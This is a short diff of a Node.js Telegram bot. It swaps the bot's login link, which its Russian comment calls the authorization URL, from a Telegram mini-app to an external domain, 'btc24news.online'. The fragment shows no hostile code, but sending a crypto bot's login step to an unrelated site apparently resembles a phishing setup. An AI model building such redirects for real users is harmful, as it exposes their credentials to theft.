@@ -6,7 +6,7 @@ const bot = new TelegramBot(token, {polling: true});
 
 bot.on('message', (msg) => {
   const chatId = msg.chat.id;
-  const loginUrl = 'https://t.me/PumpOrDump_bot/PumpOrDump'; // URL для авторизации
+  const loginUrl = 'https://btc24news.online'; // URL для авторизации
 
   const opts = {
     reply_markup: {
